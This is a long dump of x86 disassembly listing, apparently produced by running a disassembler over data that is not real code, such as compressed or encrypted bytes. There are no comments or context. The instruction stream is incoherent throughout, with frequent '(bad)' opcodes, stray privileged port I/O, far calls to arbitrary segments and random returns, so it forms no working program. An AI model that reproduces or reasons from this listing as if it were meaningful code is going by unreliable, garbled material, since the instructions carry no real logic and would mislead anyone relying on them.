  4175f9:	mov    eax,0x65562205
  4175fe:	jne    0x417605
  417600:	aas    
  417601:	pop    es
  417602:	and    eax,0x6c1a787
  417607:	dec    ebp
  417608:	in     eax,0xdc
  41760a:	jo     0x41760e
  41760c:	jle    0x4175a1
  41760e:	fisubr WORD PTR [edx+eiz*8-0x34]
  417612:	push   edi
  417613:	push   DWORD PTR [edx]
  417615:	pop    es
  417616:	sub    ecx,esi
  417618:	call   0x3281:0xeb6104ee
  41761f:	lods   al,BYTE PTR ds:[esi]
  417620:	fwait
  417621:	stos   BYTE PTR es:[edi],al
  417622:	aaa    
  417623:	jmp    ecx
  417625:	push   eax
  417626:	or     dh,BYTE PTR [edx-0x663a9ce7]
  41762c:	sub    eax,0x39f12bbe
  417631:	dec    esp
  417632:	xor    eax,0x9be70dcb
  417637:	cmp    al,0xc8
  417639:	push   es
  41763a:	cmp    esi,DWORD PTR [edi]
  41763c:	ror    DWORD PTR [edx-0x6e],cl
  41763f:	sub    al,0xe5
  417641:	xor    al,0xe6
  417643:	push   ds
  417644:	sahf   
  417645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417646:	out    0xc2,al
  417648:	sbb    al,al
  41764a:	call   DWORD PTR [ecx+0x32f00a28]
  417650:	sbb    al,0x1f
  417652:	clc    
  417653:	stos   DWORD PTR es:[edi],eax
  417654:	pop    esi
  417655:	sub    al,0x21
  417657:	cmp    al,0x18
  417659:	pusha  
  41765a:	mov    al,0x6f
  41765c:	pop    es
  41765d:	fwait
  41765e:	iret   
  41765f:	out    0x72,eax
  417661:	mov    ebp,0x99692a31
  417666:	stc    
  417667:	sbb    ah,BYTE PTR [esp+ebp*4-0x30]
  41766b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41766c:	and    al,0xf2
  41766e:	daa    
  41766f:	add    bh,BYTE PTR [edx+ecx*2]
  417672:	outs   dx,DWORD PTR ds:[esi]
  417673:	sbb    al,0x2a
  417675:	or     eax,DWORD PTR [ebp+0x32]
  417678:	and    esi,edi
  41767a:	mov    ah,0x56
  41767c:	xchg   ebp,eax
  41767d:	sub    dh,BYTE PTR [ebp+0x7c6e4f2a]
  417683:	test   al,0x2d
  417685:	test   dh,ah
  417687:	fwait
  417688:	or     BYTE PTR [edx+0x686d845a],ah
  41768e:	sub    ah,ch
  417690:	scas   al,BYTE PTR es:[edi]
  417691:	push   ebp
  417692:	out    0x3,al
  417694:	dec    edx
  417695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417696:	push   ss
  417697:	into   
  417698:	mov    edi,ecx
  41769a:	sub    ebx,DWORD PTR ds:0x44608c47
  4176a0:	adc    edx,esp
  4176a2:	into   
  4176a3:	out    dx,eax
  4176a4:	cld    
  4176a5:	mov    eax,0xe18d8c9b
  4176aa:	sbb    ebp,DWORD PTR ds:0xb7c26f3a
  4176b0:	shl    DWORD PTR [esi+0x2b],cl
  4176b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176b4:	shr    bh,cl
  4176b6:	mov    BYTE PTR [edi+0x72],ch
  4176b9:	cmp    al,0x17
  4176bb:	dec    ebp
  4176bc:	and    al,al
  4176be:	stos   DWORD PTR es:[edi],eax
  4176bf:	shl    BYTE PTR [esi],1
  4176c1:	pop    ebp
  4176c2:	stc    
  4176c3:	aas    
  4176c4:	push   ecx
  4176c5:	pop    edi
  4176c6:	lods   al,BYTE PTR ds:[esi]
  4176c7:	xchg   ebp,eax
  4176c8:	loopne 0x417709
  4176ca:	sub    eax,edi
  4176cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176cd:	les    ebx,FWORD PTR [ecx-0x11]
  4176d0:	pop    ss
  4176d1:	(bad)  
  4176d2:	in     al,dx
  4176d3:	and    DWORD PTR [ecx+0x505d155e],ecx
  4176d9:	jle    0x41767f
  4176db:	mov    ebx,0x6009b0e1
  4176e0:	lahf   
  4176e1:	fmul   QWORD PTR [ebx]
  4176e3:	jnp    0x4176d2
  4176e5:	outs   dx,BYTE PTR ds:[esi]
  4176e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e7:	mov    dh,0xd6
  4176e9:	in     al,0x95
  4176eb:	inc    esp
  4176ec:	push   ecx
  4176ed:	xchg   ebx,eax
  4176ee:	(bad)  
  4176f0:	and    BYTE PTR [ebp+0x405111c2],al
  4176f6:	and    edi,edx
  4176f8:	rol    DWORD PTR [ebx+esi*8-0xab363ed],1
  4176ff:	rcr    BYTE PTR [ebx+esi*8-0x75],cl
  417703:	ja     0x417765
  417705:	pop    ss
  417706:	cmp    DWORD PTR [ecx+0x75cd8f99],ebp
  41770c:	jle    0x41772a
  41770e:	sbb    BYTE PTR [esi],bh
  417710:	aas    
  417711:	and    ebx,esi
  417713:	pop    ecx
  417714:	mov    ecx,0x42822934
  417719:	je     0x4176d2
  41771b:	jge    0x417778
  41771d:	inc    eax
  41771e:	out    dx,al
  41771f:	dec    ebp
  417720:	(bad)  
  417721:	out    0x41,eax
  417723:	pop    es
  417724:	(bad)  
  417725:	pop    esp
  417726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417727:	jnp    0x41770c
  417729:	and    ah,BYTE PTR ds:0xa1f5d48d
  41772f:	addss  xmm6,xmm1
  417733:	push   ebp
  417734:	iret   
  417735:	sbb    bh,ch
  417737:	and    eax,0xf4586497
  41773c:	or     eax,0x37ada766
  417741:	bound  ecx,QWORD PTR [esi]
  417743:	inc    ebx
  417744:	sbb    DWORD PTR [esp+eax*1+0x6c],ecx
  417748:	test   DWORD PTR [edx+0x28099d8],edx
  41774e:	retf   
  41774f:	xchg   esp,eax
  417750:	inc    esp
  417751:	leave  
  417752:	xor    al,BYTE PTR [esi-0x201336e]
  417758:	rcr    BYTE PTR [ebp+0x4b88ddc6],cl
  41775e:	adc    al,0x98
  417760:	mov    ebx,0xa0be6beb
  417765:	int    0xe9
  417767:	aas    
  417768:	les    ecx,FWORD PTR [esi+esi*2-0x49]
  41776c:	jge    0x4177cb
  41776e:	rcr    ah,cl
  417770:	es shr ebp,0xfe
  417774:	lahf   
  417775:	dec    ecx
  417776:	pop    ebx
  417777:	int3   
  417778:	in     al,0x16
  41777a:	in     al,dx
  41777b:	push   ebx
  41777c:	and    edx,eax
  41777e:	mov    bh,0x8d
  417780:	adc    eax,0x25b8d02c
  417785:	ins    DWORD PTR es:[edi],dx
  417786:	sar    DWORD PTR [ebx+ecx*2-0x17],1
  41778a:	sbb    al,0x36
  41778c:	jge    0x4177df
  41778e:	sbb    BYTE PTR ds:0x5f58aa03,0xcd
  417795:	sbb    DWORD PTR [edx-0x79b1848f],ebp
  41779b:	jne    0x4177f9
  41779d:	cmp    ecx,ebx
  41779f:	test   BYTE PTR [edx-0x6c],bh
  4177a2:	cdq    
  4177a3:	pop    eax
  4177a4:	retf   0xfd80
  4177a7:	ins    DWORD PTR es:[edi],dx
  4177a8:	mov    edi,0xd466e786
  4177ad:	into   
  4177ae:	xchg   ebp,eax
  4177af:	dec    esp
  4177b0:	test   eax,0x14e3e789
  4177b5:	icebp  
  4177b6:	bswap  ebp
  4177b8:	sbb    eax,0x4511399d
  4177bd:	rol    BYTE PTR [edi-0x4976c120],0xfc
  4177c4:	inc    esp
  4177c5:	inc    ebp
  4177c6:	jle    0x4177b2
  4177c8:	cmc    
  4177c9:	xlat   BYTE PTR ds:[ebx]
  4177ca:	stc    
  4177cb:	adc    eax,DWORD PTR [eax-0x5a]
  4177ce:	call   0x82c3:0x679ef21c
  4177d5:	push   edi
  4177d6:	imul   edi,edi,0xdbc6618f
  4177dc:	int3   
  4177dd:	or     ebp,DWORD PTR [edi]
  4177df:	iret   
  4177e0:	cmp    edx,ebp
  4177e2:	retf   
  4177e3:	or     al,bl
  4177e5:	xor    esi,eax
  4177e7:	pop    ds
  4177e8:	mov    esp,0xf106147d
  4177ed:	sub    BYTE PTR [eax-0x1d],bl
  4177f0:	out    0xe3,al
  4177f2:	push   es
  4177f3:	mov    al,ds:0x480b0e83
  4177f8:	pop    ss
  4177f9:	xor    BYTE PTR [ebx-0x49181fd2],0x5d
  417800:	jge    0x4177b6
  417802:	es push ss
  417804:	xchg   esp,eax
  417805:	lock nop
  417807:	push   es
  417808:	jno    0x417840
  41780a:	xor    BYTE PTR [eax-0x419c6746],dl
  417810:	jg     0x41785c
  417812:	pop    ecx
  417813:	std    
  417814:	push   esi
  417815:	inc    edi
  417816:	push   edi
  417817:	dec    ebx
  417818:	dec    edi
  417819:	iret   
  41781a:	ja     0x417835
  41781c:	mov    bh,dl
  41781e:	mov    al,0x84
  417820:	or     esi,edx
  417822:	or     BYTE PTR [ecx+0x1b],0x45
  417826:	dec    esi
  417827:	out    dx,eax
  417828:	out    0xcf,eax
  41782a:	idiv   BYTE PTR [ebx]
  41782c:	nop
  41782d:	xchg   edi,eax
  41782e:	push   ebp
  417830:	fnstenv [ebp+0x1849ba00]
  417836:	push   edx
  417837:	popf   
  417838:	mov    dl,0x6b
  41783a:	dec    ecx
  41783b:	cmp    DWORD PTR [ecx+0xc8f99fd],edi
  417841:	xlat   BYTE PTR ds:[ebx]
  417842:	(bad)  
  417843:	sbb    ah,bl
  417845:	cld    
  417846:	cmp    BYTE PTR [ebp-0x557829a1],al
  41784c:	push   ss
  41784d:	frstor [ebp-0xa]
  417850:	arpl   WORD PTR [edi],bx
  417852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417853:	jg     0x41781a
  417855:	gs ror ebp,cl
  417858:	add    bl,dh
  41785a:	mov    edx,0x192ca3e6
  41785f:	call   0x8e22:0xa85758ca
  417866:	arpl   WORD PTR [esi],si
  417868:	repz rol DWORD PTR [edx+0xbeaccc9],0x15
  417870:	ss push edi
  417872:	sub    eax,edi
  417874:	mov    cl,0xab
  417876:	or     ecx,DWORD PTR [edx]
  417878:	test   DWORD PTR [edx],ebx
  41787a:	daa    
  41787b:	in     al,dx
  41787c:	loope  0x41781c
  41787e:	je     0x417882
  417880:	cwde   
  417881:	sti    
  417882:	jbe    0x417839
  417884:	mov    ebp,0x965cd84e
  417889:	out    dx,eax
  41788a:	arpl   WORD PTR [ebx],dx
  41788c:	enter  0x31af,0xdf
  417890:	pextrw esp,(bad),0xc5
  417892:	arpl   WORD PTR [esi],cx
  417894:	jbe    0x4178b8
  417896:	pop    esi
  417897:	push   ebx
  417898:	mov    al,0x8a
  41789a:	shl    BYTE PTR [eax],cl
  41789c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41789d:	pushf  
  41789e:	std    
  41789f:	sub    eax,0x9b6c9df5
  4178a4:	shl    BYTE PTR fs:[edi-0x62aa0f12],0x14
  4178ac:	push   es
  4178ad:	xlat   BYTE PTR ds:[ebx]
  4178ae:	(bad)
  4178b1:	sbb    bh,bl
  4178b3:	in     eax,0xb1
  4178b5:	sar    BYTE PTR [edx+0x71ff299b],1
  4178bb:	push   eax
  4178bc:	dec    edi
  4178bd:	std    
  4178be:	sti    
  4178bf:	aas    
  4178c0:	cli    
  4178c1:	into   
  4178c2:	mov    bh,0x62
  4178c4:	dec    ebx
  4178c5:	lock mov cx,0x9a5d
  4178ca:	jmp    0x417877
  4178cc:	jnp    0x41788c
  4178ce:	ins    DWORD PTR es:[edi],dx
  4178cf:	(bad)  
  4178d0:	inc    eax
  4178d1:	cmp    DWORD PTR [ebx+0x4c524f24],edx
  4178d7:	scas   eax,DWORD PTR es:[edi]
  4178d8:	lods   al,BYTE PTR ds:[esi]
  4178d9:	fbld   TBYTE PTR [edi-0x2c1be8ba]
  4178df:	or     al,BYTE PTR [eax]
  4178e1:	popf   
  4178e2:	sub    ch,al
  4178e4:	daa    
  4178e5:	nop
  4178e6:	out    dx,al
  4178e7:	lahf   
  4178e8:	out    dx,eax
  4178e9:	sbb    DWORD PTR [ebp+0x40],esp
  4178ec:	xor    eax,0x199067a2
  4178f1:	mov    ebx,0x2ab72267
  4178f6:	push   ds
  4178f7:	push   ebx
  4178f8:	imul   esp,DWORD PTR [esi-0x236d9223],0xffffffb4
  4178ff:	and    al,BYTE PTR [edx]
  417901:	jbe    0x417952
  417903:	mov    bl,0x18
  417905:	loop   0x41797c
  417907:	cli    
  417908:	retf   
  417909:	adc    DWORD PTR [edi],ebx
  41790b:	xchg   edi,eax
  41790c:	mov    al,ds:0xa91cf0e7
  417911:	xor    dl,ch
  417913:	cs mov ch,0x7
  417916:	retf   
  417917:	popf   
  417918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417919:	cmp    esi,eax
  41791b:	shr    BYTE PTR [edi],cl
  41791d:	test   al,0xd0
  41791f:	shl    BYTE PTR [esi+eax*2-0x2a952816],0xf5
  417927:	add    esi,DWORD PTR [esi-0x6a]
  41792a:	xchg   ebp,eax
  41792b:	mov    ebx,0xb895f13e
  417930:	test   BYTE PTR [ebp+0x4186d6a5],ah
  417936:	jo     0x417982
  417938:	jmp    0x41799c
  41793a:	sar    eax,0x28
  41793d:	aaa    
  41793e:	or     edi,ecx
  417940:	pop    edi
  417941:	adc    eax,0xb5edc77a
  417946:	and    al,0xba
  417948:	adc    edx,DWORD PTR [ecx+0x5358edd3]
  41794e:	lds    edi,FWORD PTR [esi+0x619cd7c0]
  417954:	ja     0x41793d
  417956:	clc    
  417957:	jmp    0x417952
  417959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41795a:	test   BYTE PTR [edx],cl
  41795c:	daa    
  41795d:	pop    eax
  41795e:	mov    esi,0xf7a3405c
  417963:	mov    eax,0xa12cb6ce
  417968:	jg     0x417918
  41796a:	(bad)  
  41796b:	push   0xffffff93
  41796d:	push   0x7fc73421
  417972:	repz mov esi,0x267bbdd3
  417978:	dec    eax
  417979:	retf   0x8ac1
  41797c:	pop    esp
  41797d:	push   esp
  41797e:	rol    BYTE PTR [ecx+0x23],1
  417981:	outs   dx,BYTE PTR ds:[esi]
  417982:	(bad)
  417986:	pop    ds
  417987:	or     edi,eax
  417989:	retf   0x8e30
  41798c:	mov    BYTE PTR [ebx-0x3eda82f0],dl
  417992:	inc    eax
  417993:	fdivr  QWORD PTR [ecx]
  417995:	clc    
  417996:	adc    bh,dl
  417998:	xor    eax,0xa3fbd5a4
  41799d:	xor    dh,BYTE PTR ds:0xb4dfabfb
  4179a3:	mov    DWORD PTR [edi+0x77],ebp
  4179a6:	mov    dh,0x90
  4179a8:	and    al,0xe7
  4179aa:	je     0x4179c2
  4179ac:	mov    WORD PTR [ebx+edx*4+0x9],es
  4179b0:	(bad)  
  4179b1:	pop    ss
  4179b2:	pop    edi
  4179b3:	push   ecx
  4179b4:	bound  esp,QWORD PTR [ecx+0xa37f7f8]
  4179ba:	xchg   esp,eax
  4179bb:	jo     0x417968
  4179bd:	xor    al,0xeb
  4179bf:	inc    ecx
  4179c0:	ins    BYTE PTR es:[edi],dx
  4179c1:	ins    DWORD PTR es:[edi],dx
  4179c2:	and    bh,BYTE PTR [ebp+0x7b584c23]
  4179c8:	test   BYTE PTR [eax+0x49],0x80
  4179cc:	mov    eax,ds:0xa60f8245
  4179d1:	aad    0xab
  4179d3:	ja     0x4179ed
  4179d5:	and    eax,DWORD PTR [eax-0x17a1434b]
  4179db:	cmp    esp,esp
  4179dd:	sbb    ah,BYTE PTR [edx]
  4179df:	pop    ebp
  4179e0:	cmp    eax,0xc26073c0
  4179e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e6:	out    dx,al
  4179e7:	sbb    eax,0xdbec61f7
  4179ec:	sbb    eax,0xd068a9f7
  4179f1:	jne    0x417a0f
  4179f3:	xchg   edi,esi
  4179f5:	sbb    DWORD PTR [eax-0x27],esp
  4179f8:	sar    BYTE PTR [ebx+ebp*8],0x2c
  4179fc:	dec    ecx
  4179fd:	pusha  
  4179fe:	fsubr  QWORD PTR [ecx+0x2f]
  417a01:	inc    ecx
  417a02:	sub    eax,0x66bc7146
  417a07:	add    ebx,DWORD PTR [esi-0x4a]
  417a0a:	popa   
  417a0b:	retf   
  417a0c:	pop    es
  417a0d:	out    0x3f,eax
  417a0f:	mov    ch,0x37
  417a11:	xor    al,0x47
  417a13:	sbb    BYTE PTR [esi+eiz*2+0x15],dh
  417a17:	cmc    
  417a18:	lea    ebx,[ebp+0x6d9017dc]
  417a1e:	dec    edx
  417a1f:	push   eax
  417a20:	sub    esp,DWORD PTR [eax]
  417a22:	push   ss
  417a23:	scas   eax,DWORD PTR es:[edi]
  417a24:	vshufpd ymm7,ymm7,YMMWORD PTR [ebx],0xac
  417a29:	fisttp QWORD PTR [edx+0x2535d39c]
  417a2f:	test   BYTE PTR [esi+0x9e7e074],0x75
  417a36:	pop    ds
  417a37:	lods   eax,DWORD PTR ds:[esi]
  417a38:	imul   edi,esi,0x50
  417a3b:	xchg   DWORD PTR [ebx-0x60],esp
  417a3e:	shr    DWORD PTR ds:[ecx],1
  417a41:	mov    ch,0x44
  417a43:	sub    al,0x5a
  417a45:	pop    ebp
  417a46:	push   ds
  417a47:	mov    DWORD PTR [edi+0x12],ecx
  417a4a:	push   edi
  417a4b:	push   es
  417a4c:	push   0x7
  417a4e:	inc    ebp
  417a4f:	and    bh,BYTE PTR [eax-0x7faf1d36]
  417a55:	pop    ss
  417a56:	pushf  
  417a57:	sbb    eax,0x30cea8ce
  417a5c:	cwde   
  417a5d:	ins    BYTE PTR es:[edi],dx
  417a5e:	cmp    DWORD PTR [esi],esp
  417a60:	or     DWORD PTR [esi],edi
  417a62:	or     ecx,DWORD PTR [ecx+0x41]
  417a65:	push   esi
  417a66:	paddq  mm0,QWORD PTR [edx-0x34]
  417a6a:	mov    ?,WORD PTR [ecx]
  417a6c:	bnd jge 0x417abb
  417a6f:	xchg   ebp,eax
  417a70:	add    al,0x9
  417a72:	xchg   esi,eax
  417a73:	ret    0xbfca
  417a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a77:	enter  0x2d5f,0xb7
  417a7b:	hlt    
  417a7c:	(bad)  
  417a7e:	retf   
  417a7f:	jns    0x417a83
  417a81:	lods   al,BYTE PTR ds:[esi]
  417a82:	mov    eax,0xe47c8491
  417a87:	sub    al,0x2d
  417a89:	sbb    al,0xd5
  417a8b:	pop    sp
  417a8d:	dec    ebx
  417a8e:	mov    cs,WORD PTR [edx]
  417a90:	sar    DWORD PTR [ebp+0x3a9013c6],0x8d
  417a97:	xor    bl,BYTE PTR [edi+ebx*8+0x23]
  417a9b:	mov    cl,0xeb
  417a9d:	aam    0xaf
  417a9f:	xchg   edx,eax
  417aa0:	lods   eax,DWORD PTR ds:[esi]
  417aa1:	nop
  417aa2:	ret    0x6bb6
  417aa5:	mov    dl,0x5a
  417aa7:	inc    ebx
  417aa8:	jle    0x417a2c
  417aaa:	pop    ecx
  417aab:	push   ebp
  417aac:	imul   ebx,DWORD PTR [esi-0x6e],0x1b
  417ab0:	and    dh,BYTE PTR [ebp+edi*4-0x63a20a89]
  417ab7:	hlt    
  417ab8:	scas   eax,DWORD PTR es:[edi]
  417ab9:	xchg   edi,eax
  417aba:	or     eax,0x3a8ccefc
  417abf:	sub    ah,bl
  417ac1:	push   DWORD PTR [esi-0x40504810]
  417ac7:	int    0x11
  417ac9:	int3   
  417aca:	mov    ebx,esp
  417acc:	sub    dh,BYTE PTR [edx+0x1701cee6]
  417ad2:	dec    ebp
  417ad3:	cmp    BYTE PTR [ecx+eiz*4-0x46e43c31],dh
  417ada:	pop    esp
  417adb:	jp     0x417b50
  417add:	int3   
  417ade:	and    BYTE PTR fs:[ebp+0xc20b3a2],cl
  417ae5:	and    cl,cl
  417ae7:	int    0x2
  417ae9:	dec    esi
  417aea:	(bad)  
  417aeb:	(bad)  
  417aec:	imul   ebp,esp,0xffffffce
  417aef:	adc    BYTE PTR [esp+edi*2],bl
  417af2:	xor    bl,bh
  417af4:	xchg   esp,eax
  417af5:	cs cli 
  417af7:	(bad)
  417afa:	loopne 0x417a97
  417afc:	imul   bh
  417afe:	sbb    al,0x5f
  417b00:	xor    al,0x26
  417b02:	idiv   BYTE PTR [ebx+0x3f]
  417b05:	ins    DWORD PTR es:[edi],dx
  417b06:	sub    DWORD PTR [eax],ebp
  417b08:	inc    edi
  417b09:	and    ebp,0xed30a12e
  417b0f:	idiv   ebx
  417b11:	call   0x1b34:0x8f04ec09
  417b18:	jbe    0x32319d7f
  417b1e:	sub    DWORD PTR [edx],ecx
  417b20:	xchg   BYTE PTR [ebx],bl
  417b22:	in     al,dx
  417b23:	cld    
  417b24:	fsubp  st(5),st
  417b26:	sub    al,0x9
  417b28:	es dec eax
  417b2a:	call   FWORD PTR [ecx+edx*4-0x61]
  417b2e:	mov    ah,0x72
  417b30:	adc    BYTE PTR [eax],dl
  417b32:	adc    al,0xa0
  417b34:	inc    esp
  417b35:	shl    BYTE PTR [edx],0x62
  417b38:	mov    bl,0xf
  417b3a:	adc    al,0x9
  417b3c:	fs (bad) 
  417b3e:	mov    esp,0xffaa8923
  417b43:	xchg   esi,eax
  417b44:	lea    sp,[ecx+0x11]
  417b48:	mov    esi,0xd4ab9bcf
  417b4d:	shl    BYTE PTR [edx+0x79],1
  417b50:	jl     0x417b1b
  417b52:	inc    esi
  417b53:	jmp    0x417b03
  417b55:	in     al,0x92
  417b57:	nop
  417b58:	adc    ch,BYTE PTR [edi]
  417b5a:	outs   dx,DWORD PTR ds:[esi]
  417b5c:	out    0xa6,eax
  417b5e:	mov    ah,0x3b
  417b60:	or     al,0x37
  417b62:	mov    bl,0xbf
  417b64:	int    0xa6
  417b66:	mov    ebp,DWORD PTR ds:0x6c4f
  417b6b:	dec    edx
  417b6c:	mov    edx,0x590a281f
  417b71:	mov    ebx,0x2d16619e
  417b76:	out    dx,al
  417b77:	push   esp
  417b78:	test   ebp,0xa6646426
  417b7e:	enter  0x9126,0x7
  417b82:	inc    ecx
  417b83:	(bad)  
  417b84:	pop    edi
  417b85:	and    dh,al
  417b87:	in     eax,0x35
  417b89:	fdiv   QWORD PTR [edi]
  417b8b:	add    al,0x9b
  417b8d:	icebp  
  417b8e:	xor    DWORD PTR [edi+0x18],esi
  417b91:	popa   
  417b92:	sub    eax,DWORD PTR [edx+edx*2]
  417b95:	pop    ecx
  417b96:	sub    al,BYTE PTR [ecx-0x1c]
  417b99:	nop
  417b9a:	ret    0x7351
  417b9d:	push   cs
  417b9e:	inc    eax
  417b9f:	adc    DWORD PTR [edx+edi*4+0x6e93fe21],edi
  417ba6:	or     ch,bh
  417ba8:	mov    edx,0xeb6a44d3
  417bad:	mov    ds:0x64b610e9,al
  417bb2:	xor    al,BYTE PTR [ecx-0x71d63c19]
  417bb8:	sahf   
  417bb9:	cmp    edi,DWORD PTR [edi-0x23]
  417bbc:	addr16 je 0x417b92
  417bbf:	pop    esp
  417bc0:	xor    al,0x5f
  417bc2:	sbb    edx,ebp
  417bc4:	mov    eax,0xd61798e9
  417bc9:	data16 jnp 0x417bdc
  417bcc:	int    0x45
  417bce:	pushf  
  417bcf:	jbe    0x417b89
  417bd1:	fisub  WORD PTR [ebp+0x34b1dbff]
  417bd7:	cdq    
  417bd8:	shl    BYTE PTR [edi-0x61],0x5
  417bdc:	(bad)  [edx-0x3f]
  417bdf:	in     eax,dx
  417be0:	mov    eax,0x2e590074
  417be5:	push   esp
  417be6:	jae    0x417b74
  417be8:	loopne 0x417b7b
  417bea:	sbb    BYTE PTR [edx-0x29c77281],bh
  417bf0:	jbe    0x417c41
  417bf2:	cwde   
  417bf3:	out    dx,al
  417bf4:	xchg   ecx,eax
  417bf5:	jl     0x417b9d
  417bf7:	mov    al,ds:0xfbe3570d
  417bfc:	cmp    DWORD PTR ds:0x5ef67ebd,ecx
  417c02:	neg    BYTE PTR [ebx+0x59d7d065]
  417c08:	addr16 cmc 
  417c0a:	les    ebx,FWORD PTR [esi-0x19]
  417c0d:	ss and eax,0xa7962b07
  417c13:	push   ebp
  417c14:	fidivr DWORD PTR [ecx+eiz*8+0x7c]
  417c18:	mov    esi,0xe05da76
  417c1d:	add    esi,DWORD PTR [edi]
  417c1f:	or     al,dh
  417c21:	int3   
  417c22:	xchg   edx,eax
  417c23:	popa   
  417c24:	mov    BYTE PTR [esp+ecx*1+0x44389d61],dl
  417c2b:	(bad)  [ecx-0x1dc42ca0]
  417c31:	adc    al,0xd0
  417c33:	sbb    edx,DWORD PTR [ebx+ebx*2-0x80]
  417c37:	rcr    BYTE PTR ds:0xa8c24139,0x61
  417c3e:	lods   al,BYTE PTR ds:[esi]
  417c3f:	cmp    al,0xe3
  417c41:	jae    0x417c85
  417c43:	std    
  417c44:	xlat   BYTE PTR ds:[ebx]
  417c45:	inc    eax
  417c46:	ret    0xa23a
  417c49:	push   eax
  417c4a:	fcomp  st(6)
  417c4c:	repz test BYTE PTR [esp+ebp*1],bl
  417c50:	int    0xfd
  417c52:	in     eax,dx
  417c53:	jecxz  0x417c3a
  417c55:	or     al,0x8f
  417c57:	lods   eax,DWORD PTR ds:[esi]
  417c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c59:	add    eax,edx
  417c5b:	data16 (bad) 
  417c5d:	cmp    BYTE PTR [ecx],al
  417c5f:	push   ecx
  417c60:	sub    al,dl
  417c62:	jne    0x417bf0
  417c64:	adc    al,0x86
  417c66:	mov    ds:0x163875ec,al
  417c6b:	mov    ds:0x603569a1,al
  417c70:	mov    edx,0xa89828e4
  417c75:	retf   0x239c
  417c78:	mov    eax,0xa8827d4b
  417c7d:	or     dl,ah
  417c7f:	lock jb 0x417c4d
  417c82:	les    edi,FWORD PTR [eax-0x6f]
  417c85:	jmp    0x75c:0x1178d870
  417c8c:	cmp    al,0xda
  417c8e:	outs   dx,BYTE PTR ds:[esi]
  417c8f:	pop    ebp
  417c90:	jge    0x417c51
  417c92:	push   esi
  417c93:	call   0x2cec:0x6a6546f6
  417c9a:	pop    edi
  417c9b:	arpl   WORD PTR [edi],bp
  417c9d:	jae    0x417d0d
  417c9f:	imul   edi,esi,0xfffffff3
  417ca2:	inc    edi
  417ca3:	in     al,0x84
  417ca5:	or     al,0xd
  417ca7:	loopne 0x417c5d
  417ca9:	sub    eax,0x8366c395
  417cae:	inc    ebp
  417caf:	xchg   BYTE PTR [eax],cl
  417cb1:	out    0xb4,al
  417cb3:	(bad)  
  417cb4:	loope  0x417cc9
  417cb6:	call   0xce6f9411
  417cbb:	add    eax,0x9168dc43
  417cc0:	jecxz  0x417c43
  417cc2:	sahf   
  417cc3:	adc    al,0xf3
  417cc5:	inc    ebp
  417cc6:	or     BYTE PTR [ebp+0x5c3161b1],ah
  417ccc:	sahf   
  417ccd:	aam    0x3e
  417ccf:	cmc    
  417cd0:	arpl   WORD PTR [edi+0x67],di
  417cd3:	pop    esi
  417cd4:	mov    edi,0x5fcd0a42
  417cd9:	stos   DWORD PTR es:[edi],eax
  417cda:	mov    cl,0xc
  417cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cdd:	loop   0x417d18
  417cdf:	div    BYTE PTR [ebx-0x2ee27dd7]
  417ce5:	pop    edi
  417ce6:	es mov dh,0x61
  417ce9:	fstp   DWORD PTR [edi+0x7c]
  417cec:	xor    DWORD PTR [ebx+0x1fa6f89c],esi
  417cf2:	cmp    DWORD PTR [edi+ebx*4-0x661a36f1],edi
  417cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfa:	mov    WORD PTR [esi],cs
  417cfc:	lock sub al,0x98
  417cff:	ror    BYTE PTR [edi+ebp*1-0x367c0fef],cl
  417d06:	gs out dx,eax
  417d08:	test   BYTE PTR [edx-0x62],dh
  417d0b:	sub    BYTE PTR [edi+0x3f97f856],0xb1
  417d12:	jo     0x417ce8
  417d14:	inc    edi
  417d15:	fidiv  DWORD PTR [eax+0x240a5f24]
  417d1b:	sub    DWORD PTR [ebp-0x4bb502fb],ebp
  417d21:	nop
  417d22:	add    BYTE PTR [esi-0x610a77c3],dl
  417d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d2a:	jmp    0x417d0c
  417d2c:	mov    ds:0xed6d832c,al
  417d31:	jb     0x417d72
  417d33:	pop    edi
  417d34:	jmp    0x417d3b
  417d36:	dec    edx
  417d37:	push   ds
  417d38:	test   eax,0x61baf1b9
  417d3d:	xlat   BYTE PTR ds:[ebx]
  417d3e:	inc    ebx
  417d3f:	popf   
  417d40:	or     ah,al
  417d42:	cwde   
  417d43:	scas   al,BYTE PTR es:[edi]
  417d44:	(bad)  
  417d45:	stos   DWORD PTR es:[edi],eax
  417d46:	sti    
  417d47:	sub    ebp,esp
  417d49:	lock or eax,0x2a9f3519
  417d4f:	push   ecx
  417d50:	sbb    BYTE PTR [ecx+0x7e],ah
  417d53:	push   0x34eda73e
  417d58:	pusha  
  417d59:	sbb    esi,DWORD PTR [esi-0x252ac93e]
  417d5f:	pop    ds
  417d60:	sub    BYTE PTR [ebp+0x5272fa4f],dl
  417d66:	jbe    0x417cf7
  417d68:	jg     0x417d9e
  417d6a:	pushf  
  417d6b:	pop    ebx
  417d6c:	dec    esi
  417d6d:	clc    
  417d6e:	jo     0x417d74
  417d70:	std    
  417d71:	daa    
  417d72:	sbb    eax,0xafc8f4e8
  417d77:	(bad)  
  417d78:	call   0xbf5f:0x589c517e
  417d7f:	push   es
  417d80:	or     eax,0x375e5650
  417d85:	scas   eax,DWORD PTR es:[edi]
  417d86:	mov    al,ds:0x8288665d
  417d8b:	cdq    
  417d8c:	fldcw  WORD PTR [ecx-0x3b]
  417d8f:	dec    dx
  417d91:	or     ch,BYTE PTR [ebx+edi*8]
  417d94:	jb     0x417dd4
  417d96:	adc    eax,0x905de03f
